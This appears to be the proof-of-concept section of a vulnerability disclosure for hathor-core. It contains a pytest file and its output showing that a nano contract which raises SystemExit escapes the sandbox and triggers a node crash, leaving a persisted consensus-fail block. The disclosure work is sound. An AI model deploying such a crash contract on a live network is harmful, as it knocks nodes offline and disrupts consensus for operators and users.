## Proof of Concept

The PoC runs inside hathor-core's test framework using `SimulatorTestCase`, which spins up a full Hathor node with mining, consensus, RocksDB, and vertex handler. The only mock is `crash_and_exit` because it calls `sys.exit(-1)` which would kill the test process. Everything before it runs the real code -- the metadata write at `vertex_handler.py:180-182` and the block save at `vertex_handler.py:229` both happen sequentially before the mock is reached.

### Setup

```bash
git clone https://github.com/HathorNetwork/hathor-core.git && cd hathor-core
python3.11 -m venv .venv && source .venv/bin/activate && pip install -e ".[dev]"
```

Place `test_systemexit_escape.py` at `hathor_tests/nanocontracts/` and run:

```bash
python -m pytest hathor_tests/nanocontracts/test_systemexit_escape.py -s -o "addopts="
```

### test_systemexit_escape.py

```python
"""
PoC: SystemExit sandbox escape in Hathor nano contracts.
Run with: python -m pytest hathor_tests/nanocontracts/test_systemexit_escape.py -s -o "addopts="
"""

import sys
from io import StringIO
from textwrap import dedent
from unittest.mock import Mock

import hathor
from hathor.conf import HathorSettings
from hathor.execution_manager import ExecutionManager
from hathor.nanocontracts import Blueprint, Context, public
from hathor.nanocontracts.catalog import NCBlueprintCatalog
from hathor.nanocontracts.custom_builtins import EXEC_BUILTINS, DISABLED_BUILTINS
from hathor.nanocontracts.exception import NCFail
from hathor.nanocontracts.method import Method
from hathor.nanocontracts.nc_types import make_nc_type_for_arg_type as make_nc_type
from hathor.nanocontracts.types import TokenUid
from hathor.nanocontracts.utils import sign_pycoin
from hathor.simulator.trigger import StopAfterMinimumBalance, StopAfterNMinedBlocks
from hathor.transaction import Transaction
from hathor.transaction.headers import NanoHeader
from hathor_tests.nanocontracts.blueprints.unittest import BlueprintTestCase
from hathor_tests.simulation.base import SimulatorTestCase

settings = HathorSettings()
TOKEN_NC_TYPE = make_nc_type(TokenUid)


class CrashBlueprint(Blueprint):
    token_uid: TokenUid

    @public
    def initialize(self, ctx: Context, token_uid: TokenUid) -> None:
        self.token_uid = token_uid

    @public
    def crash_node(self, ctx: Context) -> None:
        raise SystemExit()


MALICIOUS_BLUEPRINT_SRC = dedent('''
    from hathor import Blueprint, Context, export, public

    @export
    class CrashBlueprint(Blueprint):
        flag: int

        @public
        def initialize(self, ctx: Context) -> None:
            self.flag = 0

        @public
        def crash_node(self, ctx: Context) -> None:
            raise SystemExit()
''')


class TestSystemExitEscape(SimulatorTestCase):
    __test__ = True

    def setUp(self):
        super().setUp()
        self.crash_blueprint_id = b'crash_bp' + b'\x00' * 24
        self.catalog = NCBlueprintCatalog({
            self.crash_blueprint_id: CrashBlueprint,
        })
        self.nc_seqnum = 0
        self.manager = self.simulator.create_peer()
        self.manager.allow_mining_without_peers()
        self.manager.tx_storage.nc_catalog = self.catalog
        self.wallet = self.manager.wallet
        self.miner = self.simulator.create_miner(self.manager, hashpower=100e6)
        self.miner.start()
        self.token_uid = TokenUid(b'\0')
        trigger = StopAfterMinimumBalance(self.wallet, self.token_uid, 1)
        self.assertTrue(self.simulator.run(7200, trigger=trigger))

    def _gen_nc_tx(self, nc_id, nc_method, nc_args):
        method_parser = Method.from_callable(getattr(CrashBlueprint, nc_method))
        nc = Transaction(timestamp=int(self.manager.reactor.seconds()))
        nc_args_bytes = method_parser.serialize_args_bytes(nc_args)
        address = self.wallet.get_unused_address()
        privkey = self.wallet.get_private_key(address)
        nano_header = NanoHeader(
            tx=nc, nc_seqnum=self.nc_seqnum, nc_id=nc_id,
            nc_method=nc_method, nc_args_bytes=nc_args_bytes,
            nc_address=b'', nc_script=b'', nc_actions=[],
        )
        nc.headers.append(nano_header)
        self.nc_seqnum += 1
        sign_pycoin(nano_header, privkey)
        nc.timestamp = int(self.manager.get_timestamp_for_new_vertex())
        nc.parents = self.manager.get_new_tx_parents(nc.timestamp)
        nc.weight = self.manager.daa.minimum_tx_weight(nc)
        return nc

    def test_full_attack(self):
        # environment
        print(f"\nhathor-core: {hathor.__version__}")
        print(f"python: {sys.version.split()[0]}")
        print(f"network: {self._settings.NETWORK_NAME}")
        print(f"nano_contracts: {self._settings.ENABLE_NANO_CONTRACTS}")
        print(f"peer_id: {self.manager.my_peer.id}")
        print(f"rocksdb: {self.manager.tx_storage._rocksdb_storage.path}")
        print(f"wallet_address: {self.wallet.get_unused_address()}")
        best = self.manager.tx_storage.get_best_block()
        print(f"best_block: {best.hash.hex()}")
        print(f"best_block_height: {best.static_metadata.height}")

        # sandbox builtins
        print(f"\nSystemExit in EXEC_BUILTINS: {'SystemExit' in EXEC_BUILTINS}")
        print(f"SystemExit in DISABLED_BUILTINS: {'SystemExit' in DISABLED_BUILTINS}")
        print(f"exit in DISABLED_BUILTINS: {'exit' in DISABLED_BUILTINS}")
        for name in ('BaseException', 'KeyboardInterrupt', 'GeneratorExit'):
            print(f"{name} in EXEC_BUILTINS: {name in EXEC_BUILTINS}, "
                  f"in DISABLED_BUILTINS: {name in DISABLED_BUILTINS}")

        assert 'SystemExit' in EXEC_BUILTINS
        assert 'SystemExit' not in DISABLED_BUILTINS

        # deploy contract
        nc_tx = self._gen_nc_tx(self.crash_blueprint_id, 'initialize', [self.token_uid])
        self.manager.cpu_mining_service.resolve(nc_tx)
        self.manager.on_new_tx(nc_tx)
        nc_id = nc_tx.hash

        trigger = StopAfterNMinedBlocks(self.miner, quantity=2)
        self.assertTrue(self.simulator.run(14400, trigger=trigger))

        nc_storage = self.manager.get_best_block_nc_storage(nc_id)
        stored_token = nc_storage.get_obj(b'token_uid', TOKEN_NC_TYPE)
        self.assertEqual(stored_token, self.token_uid)

        print(f"\nnc_id: {nc_id.hex()}")
        print(f"token_uid: {stored_token.hex()}")
        print(f"init_tx voided_by: {nc_tx.get_metadata().voided_by}")

        # crash_node() tx
        self.miner.stop()
        self.manager.reactor.advance(10)
        crash_tx = self._gen_nc_tx(nc_id, 'crash_node', [])
        self.manager.cpu_mining_service.resolve(crash_tx)
        self.manager.on_new_tx(crash_tx)
        self.assertIsNone(crash_tx.get_metadata().voided_by)

        print(f"\ncrash_tx: {crash_tx.hash.hex()}")
        print(f"crash_tx voided_by: {crash_tx.get_metadata().voided_by}")

        # mock crash_and_exit (calls sys.exit(-1), can't kill the test process)
        execution_manager_mock = Mock(spec_set=ExecutionManager)
        self.manager.vertex_handler._execution_manager = execution_manager_mock

        # mine block with crash_tx
        self.manager.reactor.advance(1)
        block = self.manager.generate_mining_block()
        self.manager.cpu_mining_service.resolve(block)
        self.manager.propagate_tx(block)

        crash_called = execution_manager_mock.crash_and_exit.called
        call_args = execution_manager_mock.crash_and_exit.call_args
        reason = call_args.kwargs.get('reason', '') if call_args else ''
        print(f"\ncrash_and_exit called: {crash_called}")
        print(f"reason: {reason}")

        assert crash_called
        assert 'on_new_vertex() failed' in reason

        # DAG persistence after crash
        block_exists = self.manager.tx_storage.transaction_exists(block.hash)
        tx_exists = self.manager.tx_storage.transaction_exists(crash_tx.hash)
        block_from_db = self.manager.tx_storage.get_transaction(block.hash)
        block_meta = block_from_db.get_metadata()
        voided = block_meta.voided_by or set()
        has_fail_id = self._settings.CONSENSUS_FAIL_ID in voided

        print(f"\nblock_hash: {block.hash.hex()}")
        print(f"block in storage: {block_exists}")
        print(f"crash_tx in storage: {tx_exists}")
        print(f"block voided_by: {voided}")
        print(f"CONSENSUS_FAIL_ID: {has_fail_id}")

        assert block_exists
        assert tx_exists
        assert has_fail_id


class TestSandboxEscapeControl(BlueprintTestCase):

    def test_sandbox_escape_vs_normal_exception(self):
        # SystemExit through the NC pipeline
        contract_id = self.gen_random_contract_id()
        blueprint_id = self._register_blueprint_contents(StringIO(MALICIOUS_BLUEPRINT_SRC))
        self.runner.create_contract(contract_id, blueprint_id, self.create_context())

        escaped = False
        try:
            self.runner.call_public_method(
                contract_id, 'crash_node', self.create_context()
            )
        except SystemExit:
            escaped = True

        print(f"\nSystemExit escaped sandbox: {escaped}")
        assert escaped

        # ValueError through the same pipeline
        safe_src = dedent('''
            from hathor import Blueprint, Context, export, public

            @export
            class SafeBlueprint(Blueprint):
                @public
                def initialize(self, ctx: Context) -> None:
                    pass

                @public
                def raise_error(self, ctx: Context) -> None:
                    raise ValueError("this should be caught")
        ''')

        contract_id2 = self.gen_random_contract_id()
        blueprint_id2 = self._register_blueprint_contents(StringIO(safe_src))
        self.runner.create_contract(contract_id2, blueprint_id2, self.create_context())

        caught_as_ncfail = False
        try:
            self.runner.call_public_method(
                contract_id2, 'raise_error', self.create_context()
            )
        except NCFail:
            caught_as_ncfail = True
        except Exception:
            pass

        print(f"ValueError caught as NCFail: {caught_as_ncfail}")
        assert caught_as_ncfail
```

### Output

```
hathor-core: 0.70.0-ac98edd-local
python: 3.11.0rc1
network: unittests
nano_contracts: enabled
peer_id: af9fea6df813eb77c2dae61d3f3b6123cfe520d544e1ea0fbe721c6ff5b2cb58
rocksdb: /tmp/tmpnqgbd5rw
wallet_address: HKFNZ5gkwkxWhitH6pFKWEFA31AfiHgp8T
best_block: 2e5ee3d35fbbbcbc1be5201e907a352e75a4a856c193b57ff76f13ea73a9b3c6
best_block_height: 11

SystemExit in EXEC_BUILTINS: True
SystemExit in DISABLED_BUILTINS: False
exit in DISABLED_BUILTINS: True
BaseException in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False
KeyboardInterrupt in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False
GeneratorExit in EXEC_BUILTINS: True, in DISABLED_BUILTINS: False

nc_id: fb18216b786c86242fe72e052590b77d5b4b4a28b9b52b179a028794c4617e32
token_uid: 00
init_tx voided_by: None

crash_tx: 3c747ea2d0678b6394437157f89f8dee1648bde552f74b7ce50f92dd14eba976
crash_tx voided_by: None

crash_and_exit called: True
reason: on_new_vertex() failed for tx aa725cf4ee33f1e45c011660945c1d576882602ebcef3435c9a7690c21ad3c3e

block_hash: aa725cf4ee33f1e45c011660945c1d576882602ebcef3435c9a7690c21ad3c3e
block in storage: True
crash_tx in storage: True
block voided_by: {b'consensus-fail'}
CONSENSUS_FAIL_ID: True
PASSED

SystemExit escaped sandbox: True
ValueError caught as NCFail: True
PASSED

2 passed in 5.11s
```
